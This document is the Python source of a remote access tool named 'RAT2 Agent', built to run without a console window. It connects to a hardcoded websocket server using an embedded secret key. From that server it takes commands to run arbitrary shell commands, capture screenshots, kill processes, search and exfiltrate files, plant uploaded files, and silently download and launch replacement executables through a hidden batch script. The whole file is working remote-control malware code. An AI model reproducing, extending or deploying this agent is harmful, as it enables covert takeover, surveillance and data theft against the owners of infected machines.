# -*- coding: utf-8 -*-
"""
RAT2 Agent - standalone build source
Compile: pyinstaller --onefile --noconsole --name agent standalone_agent.py
"""

import asyncio, base64, hashlib, io, json, os, platform, socket
import subprocess, sys, tempfile, threading, time, urllib.request, uuid
from pathlib import Path

import psutil
import websockets

FROZEN   = getattr(sys, "frozen", False)

# ── Baked-in config ───────────────────────────────────────────────────────────
MANAGER_URL = "wss://manager-production-08f2.up.railway.app/ws/agent"
SECRET_KEY  = "Zu6_4hEGklhBBQzHYjj1-0n2hbvr-6cuu4huzkufhZQ"
HEARTBEAT_INTERVAL = 5
# ─────────────────────────────────────────────────────────────────────────────

# Stable machine ID derived from MAC address — no file needed
AGENT_ID = str(uuid.UUID(int=uuid.getnode()))
LOCATION = socket.gethostname()


def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return socket.gethostbyname(socket.gethostname())

def manager_http_base():
    return MANAGER_URL.replace("wss://", "https://").replace("ws://", "http://").split("/ws/agent")[0]

def self_hash():
    return hashlib.sha256(Path(sys.executable if FROZEN else __file__).read_bytes()).hexdigest()

def registration_msg():
    return {
        "type":       "register",
        "secret":     SECRET_KEY,
        "agent_id":   AGENT_ID,
        "hostname":   socket.gethostname(),
        "os":         f"{platform.system()} {platform.release()} {platform.version()[:30]}",
        "ip":         local_ip(),
        "location":   LOCATION,
        "cpu_count":  psutil.cpu_count(logical=True),
        "total_ram":  psutil.virtual_memory().total,
        "agent_hash": self_hash(),
    }


def _exec(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=55, cwd=os.path.expanduser("~"))
        return {"stdout": r.stdout, "stderr": r.stderr, "returncode": r.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}

def _screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.thumbnail((1920, 1080))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=55)
        return {"image": base64.b64encode(buf.getvalue()).decode()}
    except ImportError:
        return {"error": "Pillow not available in this build"}
    except Exception as e:
        return {"error": str(e)}

def _processes():
    procs = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent", "status"]):
        try:
            i = p.info
            procs.append({
                "pid":            i["pid"],
                "name":           i["name"] or "",
                "cpu_percent":    round(i.get("cpu_percent") or 0.0, 2),
                "memory_percent": round(i.get("memory_percent") or 0.0, 2),
                "status":         i.get("status") or "",
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    procs.sort(key=lambda p: p["cpu_percent"], reverse=True)
    return {"processes": procs[:300]}

def _kill(pid):
    try:
        psutil.Process(pid).terminate()
        return {"success": True, "pid": pid}
    except psutil.NoSuchProcess:
        return {"error": f"No process {pid}"}
    except psutil.AccessDenied:
        return {"error": f"Access denied for {pid}"}
    except Exception as e:
        return {"error": str(e)}

def _ls(path):
    try:
        entries = []
        for entry in os.scandir(path):
            try:
                stat   = entry.stat()
                is_dir = entry.is_dir()
                name   = entry.name
                ext    = "" if is_dir else os.path.splitext(name)[1].lower()
                hidden = (name.startswith(".") if platform.system() != "Windows"
                          else bool(getattr(stat, "st_file_attributes", 0) & 2))
                entries.append({
                    "name": name, "is_dir": is_dir,
                    "size": 0 if is_dir else stat.st_size,
                    "modified": stat.st_mtime, "created": stat.st_ctime,
                    "ext": ext, "hidden": hidden,
                    "readonly": not os.access(entry.path, os.W_OK),
                })
            except Exception:
                pass
        entries.sort(key=lambda e: (not e["is_dir"], e["name"].lower()))
        return {"entries": entries}
    except PermissionError:
        return {"error": f"Permission denied: {path}"}
    except FileNotFoundError:
        return {"error": f"Not found: {path}"}
    except Exception as e:
        return {"error": str(e)}

def _search(path, query, max_results=500):
    results, q = [], query.lower()
    try:
        for root, dirs, files in os.walk(path, onerror=lambda e: None):
            for is_dir, names in ((True, dirs), (False, files)):
                for name in names:
                    if q in name.lower():
                        full = os.path.join(root, name)
                        try:
                            stat = os.stat(full)
                            results.append({
                                "name": name, "path": full, "parent": root,
                                "is_dir": is_dir,
                                "size": 0 if is_dir else stat.st_size,
                                "modified": stat.st_mtime,
                                "ext": "" if is_dir else os.path.splitext(name)[1].lower(),
                            })
                        except Exception:
                            pass
            if len(results) >= max_results:
                return {"results": results, "truncated": True}
    except Exception as e:
        return {"error": str(e)}
    return {"results": results, "truncated": False}

def _drives():
    drives = []
    for part in psutil.disk_partitions(all=False):
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device, "mountpoint": part.mountpoint,
                "fstype": part.fstype, "total": usage.total,
                "used": usage.used, "free": usage.free, "percent": usage.percent,
            })
        except Exception:
            drives.append({
                "device": part.device, "mountpoint": part.mountpoint,
                "fstype": part.fstype, "total": 0, "used": 0, "free": 0, "percent": 0,
            })
    return {"drives": drives}

def _download(path):
    try:
        data = Path(path).read_bytes()
        return {"data": base64.b64encode(data).decode(), "filename": os.path.basename(path)}
    except PermissionError:
        return {"error": f"Permission denied: {path}"}
    except FileNotFoundError:
        return {"error": f"Not found: {path}"}
    except Exception as e:
        return {"error": str(e)}

def _upload(path, data):
    try:
        Path(path).write_bytes(base64.b64decode(data))
        return {"success": True, "path": path}
    except Exception as e:
        return {"error": str(e)}

def _update():
    # Exe update: write to system temp dir (not next to the exe)
    try:
        tmp_dir = Path(tempfile.gettempdir())
        with urllib.request.urlopen(manager_http_base() + "/agent.exe", timeout=60) as resp:
            new_data = resp.read()
        if hashlib.sha256(new_data).hexdigest() == self_hash():
            return {"status": "up_to_date"}
        current = Path(sys.executable)
        tmp = tmp_dir / "rat2_update.exe"
        bat = tmp_dir / "rat2_update.bat"
        tmp.write_bytes(new_data)
        bat.write_text(
            "@echo off\r\ntimeout /t 2 /nobreak >nul\r\n"
            f'move /y "{tmp}" "{current}"\r\n'
            f'start "" "{current}"\r\ndel "%~f0"\r\n'
        )
        subprocess.Popen(
            ["cmd", "/c", str(bat)],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        return {"error": str(e)}

def _heartbeat_stats():
    disk_path = "C:\\" if platform.system() == "Windows" else "/"
    try:
        disk_pct = psutil.disk_usage(disk_path).percent
    except Exception:
        disk_pct = 0.0
    return {
        "type": "heartbeat",
        "cpu":  psutil.cpu_percent(interval=1),
        "ram":  psutil.virtual_memory().percent,
        "disk": disk_pct,
    }


async def heartbeat_loop(ws):
    loop = asyncio.get_running_loop()
    while True:
        try:
            stats = await loop.run_in_executor(None, _heartbeat_stats)
            await ws.send(json.dumps(stats))
        except Exception:
            break
        await asyncio.sleep(HEARTBEAT_INTERVAL)

async def handle_command(ws, msg):
    cmd_id = msg.get("cmd_id")
    mtype  = msg.get("type")
    loop   = asyncio.get_running_loop()
    dispatch = {
        "exec":       lambda: _exec(msg["cmd"]),
        "screenshot": lambda: _screenshot(),
        "processes":  lambda: _processes(),
        "kill":       lambda: _kill(msg["pid"]),
        "ls":         lambda: _ls(msg["path"]),
        "drives":     lambda: _drives(),
        "search":     lambda: _search(msg["path"], msg["query"]),
        "update":     lambda: _update(),
        "download":   lambda: _download(msg["path"]),
        "upload":     lambda: _upload(msg["path"], msg["data"]),
    }
    handler = dispatch.get(mtype)
    result  = await loop.run_in_executor(None, handler) if handler else {"error": f"Unknown: {mtype}"}
    result["type"]   = "result"
    result["cmd_id"] = cmd_id
    await ws.send(json.dumps(result))

async def message_loop(ws):
    async for raw in ws:
        try:
            msg = json.loads(raw)
            asyncio.create_task(handle_command(ws, msg))
        except Exception:
            pass

async def run():
    backoff = 5
    while True:
        try:
            async with websockets.connect(
                MANAGER_URL, ping_interval=20, ping_timeout=10,
                max_size=50 * 1024 * 1024,
            ) as ws:
                await ws.send(json.dumps(registration_msg()))
                backoff = 5
                hb_task  = asyncio.create_task(heartbeat_loop(ws))
                msg_task = asyncio.create_task(message_loop(ws))
                done, pending = await asyncio.wait(
                    [hb_task, msg_task], return_when=asyncio.FIRST_COMPLETED
                )
                for t in pending:
                    t.cancel()
                    try: await t
                    except asyncio.CancelledError: pass
        except websockets.exceptions.InvalidStatus as e:
            code = getattr(getattr(e, "response", None), "status_code", None)
            if code == 4001:
                os._exit(1)
        except Exception:
            pass
        await asyncio.sleep(backoff)
        backoff = min(backoff * 2, 60)


if __name__ == "__main__":
    asyncio.run(run())
